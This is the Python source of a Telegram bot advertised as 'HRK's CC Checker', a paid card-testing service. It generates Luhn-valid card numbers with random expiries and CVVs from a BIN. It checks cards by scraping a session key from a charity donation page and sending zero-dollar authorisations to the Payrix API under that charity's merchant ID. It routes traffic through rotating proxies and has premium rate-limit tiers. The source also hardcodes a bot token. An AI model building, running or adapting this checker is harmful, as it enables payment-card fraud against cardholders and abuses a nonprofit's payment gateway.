import requests
from bs4 import BeautifulSoup
import telebot
import time
import threading
from datetime import datetime, timedelta
import os
import json
import random
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Initialize the Telegram bot
bot = telebot.TeleBot("7195510626:AAHdF4spBrcmWPPx9-1gogU1yKM1Rs5qe-s")

# Owner's Telegram ID
OWNER_ID = 6460703454

# File to store user data and proxy settings
USER_DATA_FILE = "user_data.json"
if not os.path.exists(USER_DATA_FILE):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump({"premium_users": {}, "free_users": {}, "proxies": {"global": [], "users": {}}}, f)

# Load user data safely
def load_user_data():
    default_data = {"premium_users": {}, "free_users": {}, "proxies": {"global": [], "users": {}}}
    try:
        with open(USER_DATA_FILE, 'r') as f:
            content = f.read().strip()
            data = json.loads(content) if content else default_data
            for key in default_data:
                if key not in data:
                    data[key] = default_data[key]
            if "proxies" not in data or not isinstance(data["proxies"], dict):
                data["proxies"] = {"global": [], "users": {}}
            if "global" not in data["proxies"]:
                data["proxies"]["global"] = []
            if "users" not in data["proxies"]:
                data["proxies"]["users"] = {}
            return data
    except Exception as e:
        logging.error(f"Error loading user data: {str(e)}")
        return default_data

# Save user data
def save_user_data(data):
    try:
        with open(USER_DATA_FILE, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        logging.error(f"Error saving user data: {str(e)}")

# Plans configuration
PLANS = {
    "1": {"name": "Basic Premium", "cooldown": 15, "hourly_limit": 50},
    "2": {"name": "Mid-Tier Premium", "cooldown": 13, "hourly_limit": 100},
    "3": {"name": "Top-Tier Premium", "cooldown": 7, "hourly_limit": 150}
}
FREE_COOLDOWN = 30
FREE_HOURLY_LIMIT = 10

# Luhn algorithm for generating valid credit card numbers
def luhn_checksum(card_number):
    try:
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10
    except Exception as e:
        logging.error(f"Error in luhn_checksum: {str(e)}")
        return 0

def generate_card_number(prefix):
    try:
        card_length = 16
        card_number = prefix
        while len(card_number) < card_length - 1:
            card_number += str(random.randint(0, 9))
        
        checksum = luhn_checksum(int(card_number) * 10)
        check_digit = (10 - checksum) % 10
        return card_number + str(check_digit)
    except Exception as e:
        logging.error(f"Error generating card number: {str(e)}")
        return prefix + "0" * (16 - len(prefix))

# Function to check if proxy is alive by pinging a website
def check_proxy(proxy):
    if not proxy:
        return False  # No proxy provided, don't use it
    try:
        if '@' in proxy:
            auth, ip_port = proxy.split('@')
            user, passw = auth.split(':')
            ip, port = ip_port.split(':')
        else:
            ip, port, user, passw = proxy.split(':')
        
        proxies = {
            'http': f'http://{user}:{passw}@{ip}:{port}',
            'https': f'http://{user}:{passw}@{ip}:{port}'
        }
        
        # Ping Google to check if proxy is live
        response = requests.get('https://www.google.com', proxies=proxies, timeout=10)
        is_alive = response.status_code == 200
        logging.info(f"Proxy {proxy} is {'live' if is_alive else 'dead'}")
        return is_alive
    except Exception as e:
        logging.warning(f"Proxy check failed for {proxy}: {str(e)}")
        return False

# Function to get user's proxy and verify it's live
def get_user_proxy(user_id):
    try:
        user_data = load_user_data()
        user_id_str = str(user_id)
        
        # Check user-specific proxy
        if user_id_str in user_data["proxies"]["users"]:
            proxy = user_data["proxies"]["users"][user_id_str]
            if check_proxy(proxy):
                return proxy
        
        # Check global proxies
        if user_data["proxies"]["global"]:
            for proxy in user_data["proxies"]["global"]:
                if check_proxy(proxy):
                    return proxy
        
        return None  # Return None if no live proxy is found
    except Exception as e:
        logging.error(f"Error getting user proxy: {str(e)}")
        return None

# Function to fetch BIN info with optional live proxy support
def get_bin_info(card_number, proxy=None):
    bin_number = card_number[:6]
    try:
        url = f"https://api.juspay.in/cardbins/{bin_number}"
        proxies = None
        if proxy and check_proxy(proxy):  # Only use proxy if it's live
            if '@' in proxy:
                auth, ip_port = proxy.split('@')
                user, passw = auth.split(':')
                ip, port = ip_port.split(':')
            else:
                ip, port, user, passw = proxy.split(':')
            proxies = {'http': f'http://{user}:{passw}@{ip}:{port}'}
        
        response = requests.get(url, proxies=proxies if proxies else None, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "sub_type": data.get("card_sub_type", "Unknown"),
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country", "Unknown"),
                "country_code": data.get("country_code", "Unknown")
            }
    except Exception as e:
        logging.error(f"BIN API Error: {str(e)}")
    return {"brand": "Unknown", "type": "Unknown", "sub_type": "Unknown", "bank": "Unknown", "country": "Unknown", "country_code": "Unknown"}

# Function to process payment with optional live proxy support
def process_payment(card_number, exp_month, exp_year, cvv, proxy=None):
    try:
        if len(exp_year) == 4:
            exp_year = exp_year[-2:]
        elif len(exp_year) != 2:
            raise ValueError("Expiration year must be YY or YYYY format")

        proxies = None
        if proxy and check_proxy(proxy):  # Only use proxy if it's live
            if '@' in proxy:
                auth, ip_port = proxy.split('@')
                user, passw = auth.split(':')
                ip, port = ip_port.split(':')
            else:
                ip, port, user, passw = proxy.split(':')
            proxies = {'http': f'http://{user}:{passw}@{ip}:{port}'}

        url1 = "https://donate.givedirect.org"
        params = {'cid': "15724"}
        headers1 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Cache-Control': "max-age=0",
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'Upgrade-Insecure-Requests': "1",
            'Sec-Fetch-Site': "cross-site",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-User': "?1",
            'Sec-Fetch-Dest': "document",
            'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
            'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
        }
        response1 = requests.get(url1, params=params, headers=headers1, proxies=proxies if proxies else None, timeout=10)
        soup = BeautifulSoup(response1.text, 'html.parser')
        txnsession_key = soup.find('input', {'id': 'txnsession_key'})['value']

        url2 = "https://api.payrix.com/txns"
        payload = {
            'origin': "1",
            'merchant': "p1_mer_669021f7e934f033d1bc84f",
            'type': "2",
            'total': "0",
            'description': "donate live site, p1_tss_67dc2d794c04afc058f2557",
            'payment[number]': card_number,
            'payment[cvv]': cvv,
            'expiration': f"{exp_month}{exp_year}",
            'zip': "",
            'last': "Tech"
        }
        headers2 = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': "?1",
            'txnsession_key': txnsession_key,
            'x-requested-with': "XMLHttpRequest"
        }
        response2 = requests.post(url2, data=payload, headers=headers2, proxies=proxies if proxies else None, timeout=10)
        response_json = response2.json()
        errors = response_json.get('response', {}).get('errors', [])

        if errors:
            error_msg = errors[0].get('msg', 'Unknown error')
            if error_msg == "Transaction declined: No 'To' Account Specified":
                return "Card Declined\nReason: Not found, try again later"
            return error_msg
        return "Approved ✅"
    except Exception as e:
        logging.error(f"Payment processing error: {str(e)}")
        return "An error occurred while processing the card."

# Function to update loading bar
def update_loading_bar(chat_id, message_id, start_time, done_event):
    try:
        bar_length = 20
        stages = ["Processing payment...", "Fetching BIN info...", "Finalizing..."]
        while not done_event.is_set():
            elapsed_time = time.time() - start_time
            if elapsed_time > 15:
                break
            progress = min(int((elapsed_time / 10) * 100), 100)
            filled = int(bar_length * progress / 100)
            bar = "█" * filled + "░" * (bar_length - filled)
            stage_index = min(int(elapsed_time / 3), len(stages) - 1)
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{stages[stage_index]}\n[{bar}] {progress}%\nElapsed: {elapsed_time:.1f}s"
            )
            time.sleep(0.5)
    except Exception as e:
        logging.error(f"Error in loading bar: {str(e)}")

# Check cooldown and hourly limit
def can_user_check(user_id):
    try:
        user_data = load_user_data()
        now = datetime.now()
        
        if user_id == OWNER_ID:
            return True, None
        
        premium_users = user_data["premium_users"]
        free_users = user_data["free_users"]
        
        if str(user_id) in premium_users:
            plan_id = premium_users[str(user_id)].get("plan_id", "1")
            if plan_id not in PLANS:
                plan_id = "1"
            cooldown = PLANS[plan_id]["cooldown"]
            hourly_limit = PLANS[plan_id]["hourly_limit"]
            last_check = premium_users[str(user_id)].get("last_check", 0)
            checks = premium_users[str(user_id)].get("checks", [])
            checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
            premium_users[str(user_id)]["checks"] = checks
            
            if now.timestamp() - last_check < cooldown:
                return False, f"Please wait {cooldown - int(now.timestamp() - last_check)} seconds."
            if hourly_limit != float('inf') and len(checks) >= hourly_limit:
                return False, "Hourly limit reached. Upgrade your plan or wait."
            
            premium_users[str(user_id)]["last_check"] = now.timestamp()
            premium_users[str(user_id)]["checks"].append(now.isoformat())
            save_user_data(user_data)
            return True, None
        
        else:
            last_check = free_users.get(str(user_id), {}).get("last_check", 0)
            checks = free_users.get(str(user_id), {}).get("checks", [])
            checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
            if str(user_id) not in free_users:
                free_users[str(user_id)] = {"last_check": 0, "checks": []}
            free_users[str(user_id)]["checks"] = checks
            
            if now.timestamp() - last_check < FREE_COOLDOWN:
                return False, f"Please wait {FREE_COOLDOWN - int(now.timestamp() - last_check)} seconds."
            if len(checks) >= FREE_HOURLY_LIMIT:
                return False, "Hourly limit of 10 checks reached. Become premium for more."
            
            free_users[str(user_id)]["last_check"] = now.timestamp()
            free_users[str(user_id)]["checks"].append(now.isoformat())
            save_user_data(user_data)
            return True, None
    except Exception as e:
        logging.error(f"Error in can_user_check: {str(e)}")
        return False, "An error occurred while checking limits."

# Handler for hrk command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'hrk')
def handle_hrk(message):
    start_time = time.time()
    user_id = message.from_user.id
    cmd = message.text.split()[0].lstrip('/.!').lower()
    if cmd != "hrk":
        return
    
    can_check, error_msg = can_user_check(user_id)
    if not can_check:
        bot.reply_to(message, error_msg)
        return
    
    if len(message.text.split(" ", 1)) < 2:
        bot.reply_to(message, "Invalid format. Use: /hrk card_number|MM|YYYY|CVV")
        return
    
    done_event = threading.Event()
    try:
        parts = message.text.split(" ", 1)[1].split("|")
        if len(parts) != 4:
            bot.reply_to(message, "Invalid format. Use: /hrk card_number|MM|YYYY|CVV")
            return
        
        card_number, exp_month, exp_year, cvv = parts
        proxy = get_user_proxy(user_id)
        proxy_info = f"\nProxy: {proxy if proxy else 'None'}" if proxy else ""
        
        loading_message = bot.reply_to(message, "Processing payment...\n[░░░░░░░░░░░░░░░░░░░░] 0%\nElapsed: 0.0s")
        
        loading_thread = threading.Thread(
            target=update_loading_bar,
            args=(message.chat.id, loading_message.message_id, start_time, done_event)
        )
        loading_thread.start()
        
        response_msg = process_payment(card_number, exp_month, exp_year, cvv, proxy)
        bin_info = get_bin_info(card_number, proxy)
        time_taken = f"{time.time() - start_time:.2f} seconds"
        done_event.set()
        
        response = (
            f"{'Approved ✅' if response_msg == 'Approved ✅' else 'Declined ❌'}\n\n"
            f"CC ⇾ {card_number}|{exp_month}|{exp_year}|{cvv}\n"
            f"Gateway ⇾ HRK'S SPECIAL AUTH{proxy_info}\n"
            f"Response ⇾ {response_msg}\n\n"
            f"Info ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['sub_type']}\n"
            f"Issuer ⇾ {bin_info['bank']}\n"
            f"Country ⇾ {bin_info['country']}\n\n"
            f"Time Taken ⇾ {time_taken}"
        )
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_message.message_id, text=response)
    
    except Exception as e:
        done_event.set()
        bot.reply_to(message, "An error occurred. Please try again.")
        logging.error(f"Error in hrk command from user {user_id}: {str(e)}")

# Handler for gen command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'gen')
def handle_gen(message):
    user_id = message.from_user.id
    cmd = message.text.split()[0].lstrip('/.!').lower()
    if cmd != "gen":
        return
    
    if len(message.text.split(" ", 1)) < 2:
        bot.reply_to(message, "Invalid format. Usage:\n"
                     "/gen BIN\n"
                     "/gen BIN|MM|YY|CVV\n"
                     "/gen BINXXXX|XX|XX|XXX")
        return
    
    start_time = time.time()
    try:
        input_str = message.text.split(" ", 1)[1].strip()
        parts = input_str.split("|")
        bin_prefix = parts[0].replace("X", "").replace("x", "").strip()
        
        if not bin_prefix.isdigit():
            bot.reply_to(message, "BIN must contain only numbers.")
            return
        
        cards = []
        for _ in range(10):
            card_number = generate_card_number(bin_prefix)
            month = random.randint(1, 12)
            year = random.randint(2026, 2031)
            cvv = random.randint(100, 999)
            cards.append(f"{card_number}|{month:02d}|{year}|{cvv}")
        
        proxy = get_user_proxy(user_id)
        bin_info = get_bin_info(bin_prefix, proxy)
        time_taken = f"{time.time() - start_time:.2f} seconds"
        
        response = (
            f"BIN ⇾ {bin_prefix}\n"
            f"Amount ⇾ 10\n\n"
            f"{'-' * 30}\n"
            f"\n".join(cards) + "\n"
            f"{'-' * 30}\n\n"
            f"Info ⇾ {bin_info['brand']} - {bin_info['type']} - {bin_info['sub_type']}\n"
            f"Issuer ⇾ {bin_info['bank']}\n"
            f"Country ⇾ {bin_info['country']}\n\n"
            f"Time Taken ⇾ {time_taken}"
        )
        
        bot.reply_to(message, response)
    
    except Exception as e:
        bot.reply_to(message, "An error occurred while generating CC.")
        logging.error(f"Error in gen command from user {user_id}: {str(e)}")

# Handler for plan command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'plan')
def handle_plan(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            raise ValueError("Invalid number of arguments")
        _, user_id, plan_id = parts
        user_id = int(user_id)
        if plan_id not in PLANS:
            bot.reply_to(message, f"Invalid plan ID. Available plans: {', '.join(PLANS.keys())}")
            return
        
        user_data = load_user_data()
        user_data["premium_users"][str(user_id)] = {
            "plan_id": plan_id,
            "last_check": 0,
            "checks": []
        }
        save_user_data(user_data)
        bot.reply_to(message, f"User {user_id} assigned to {PLANS[plan_id]['name']} (Plan {plan_id}).")
    except Exception as e:
        bot.reply_to(message, "Usage: /plan user_id plan_id")
        logging.error(f"Error in plan command: {str(e)}")

# Handler for info command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'info')
def handle_info(message):
    user_id = str(message.from_user.id)
    try:
        user_data = load_user_data()
        now = datetime.now()

        if int(user_id) == OWNER_ID:
            response = (
                f"👤 User Info {user_id}\n"
                f"📛 Plan: Owner (Unlimited Access 🚀)\n"
                f"⏳ Cooldown: None\n"
                f"🚀 Hourly Limit: Infinite\n"
                f"✅ Remaining Checks: Unlimited\n"
                f"🔄 Limit Resets In: Not Applicable"
            )
        
        elif user_id in user_data["premium_users"]:
            user_info = user_data["premium_users"][user_id]
            plan_id = user_info.get("plan_id", "1")
            plan = PLANS.get(plan_id, PLANS["1"])
            cooldown = plan["cooldown"]
            hourly_limit = plan["hourly_limit"]
            checks = user_info.get("checks", [])
            
            valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
            remaining_checks = max(hourly_limit - len(valid_checks), 0)
            
            if valid_checks:
                next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
                time_until_reset = str(next_reset_time - now).split('.')[0]
            else:
                time_until_reset = "Resets on next request"

            response = (
                f"👤 User Info {user_id}\n"
                f"📛 Plan: {plan['name']}\n"
                f"⏳ Cooldown: {cooldown} seconds\n"
                f"🚀 Hourly Limit: {hourly_limit}\n"
                f"✅ Remaining Checks: {remaining_checks}\n"
                f"🔄 Limit Resets In: {time_until_reset}"
            )
        
        else:
            user_info = user_data["free_users"].get(user_id, {})
            last_check = user_info.get("last_check", 0)
            checks = user_info.get("checks", [])
            
            valid_checks = [t for t in checks if now - datetime.fromisoformat(t) < timedelta(hours=1)]
            remaining_checks = max(FREE_HOURLY_LIMIT - len(valid_checks), 0)
            
            if valid_checks:
                next_reset_time = datetime.fromisoformat(valid_checks[0]) + timedelta(hours=1)
                time_until_reset = str(next_reset_time - now).split('.')[0]
            else:
                time_until_reset = "Resets on next request"

            response = (
                f"👤 User Info {user_id}\n"
                f"📛 Plan: Free User\n"
                f"⏳ Cooldown: {FREE_COOLDOWN} seconds\n"
                f"🚀 Hourly Limit: {FREE_HOURLY_LIMIT}\n"
                f"✅ Remaining Checks: {remaining_checks}\n"
                f"🔄 Limit Resets In: {time_until_reset}"
            )
        
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, "An error occurred while fetching info.")
        logging.error(f"Error in info command: {str(e)}")

# Handler for proxy command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'proxy')
def handle_proxy(message):
    user_id = message.from_user.id
    try:
        if len(message.text.split(" ", 1)) < 2:
            raise ValueError("Proxy not provided")
        proxy = message.text.split(" ", 1)[1].strip()
        if check_proxy(proxy):
            user_data = load_user_data()
            user_data["proxies"]["users"][str(user_id)] = proxy
            save_user_data(user_data)
            bot.reply_to(message, f"✅ Proxy set successfully: {proxy}")
        else:
            bot.reply_to(message, "❌ Proxy is dead or invalid.")
    except Exception as e:
        bot.reply_to(message, "Usage: /proxy ip:port:user:pass or user:pass@ip:port")
        logging.error(f"Error in proxy command: {str(e)}")

# Handler for global proxy command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'gproxy')
def handle_global_proxy(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to use this command.")
        return
    
    try:
        if len(message.text.split(" ", 1)) < 2:
            raise ValueError("No proxies provided")
        proxies_text = message.text.split(" ", 1)[1].strip()
        proxies = proxies_text.split("\n")
        valid_proxies = []
        
        for proxy in proxies:
            proxy = proxy.strip()
            if proxy and check_proxy(proxy):
                valid_proxies.append(proxy)
        
        if not valid_proxies:
            bot.reply_to(message, "❌ No valid/live proxies found.")
            return
            
        user_data = load_user_data()
        user_data["proxies"]["global"] = valid_proxies
        save_user_data(user_data)
        bot.reply_to(message, f"✅ Global proxies set ({len(valid_proxies)} live):\n" + "\n".join(valid_proxies))
    except Exception as e:
        bot.reply_to(message, "Usage: /gproxy ip:port:user:pass\nip:port:user:pass\nor user:pass@ip:port")
        logging.error(f"Error in gproxy command: {str(e)}")

# Handler for myproxy command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'myproxy')
def handle_myproxy(message):
    user_id = str(message.from_user.id)
    try:
        user_data = load_user_data()
        user_proxy = user_data["proxies"]["users"].get(user_id)
        global_proxies = user_data["proxies"]["global"]
        
        response = "Your Proxy Status:\n"
        response += f"Personal Proxy: {user_proxy if user_proxy else 'Not set'} {'(live)' if user_proxy and check_proxy(user_proxy) else '(dead/not set)'}\n"
        live_global = [p for p in global_proxies if check_proxy(p)]
        response += f"Global Proxies: {len(global_proxies)} set, {len(live_global)} live"
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, "An error occurred while checking proxy status.")
        logging.error(f"Error in myproxy command: {str(e)}")

# Handler for start command
@bot.message_handler(func=lambda message: message.text.split()[0].lower().lstrip('/.!') == 'start')
def handle_start(message):
    try:
        user_id = message.from_user.id
        response = (
            f"👋 Welcome to HRK's CC Checker, {message.from_user.first_name}!\n\n"
            f"⚡ Commands (Use /, ., or !):\n"
            f"📌 hrk card|MM|YYYY|CVV - Check card\n"
            f"📌 gen BIN - Generate 10 CCs (e.g., 539634)\n"
            f"📌 info - Plan info\n"
            f"📌 proxy - Set personal proxy (optional)\n"
            f"📌 myproxy - Check proxy status\n"
            f"🚀 Premium Plans:\n"
            f"🔹 Basic: 15s cooldown, 50/hr\n"
            f"🔹 Mid-Tier: 13s cooldown, 100/hr\n"
            f"🔹 Top-Tier: 7s cooldown, 150/hr\n"
            f"🔄 Free: 30s cooldown, 10/hr\n\n"
            f"📝 Proxy Format: ip:port:user:pass or user:pass@ip:port (optional)"
        )
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, "An error occurred while starting.")
        logging.error(f"Error in start command: {str(e)}")

# Start the bot with error handling
def main():
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Bot polling error: {str(e)}")
            time.sleep(5)  # Wait before retrying

if __name__ == "__main__":
    main()
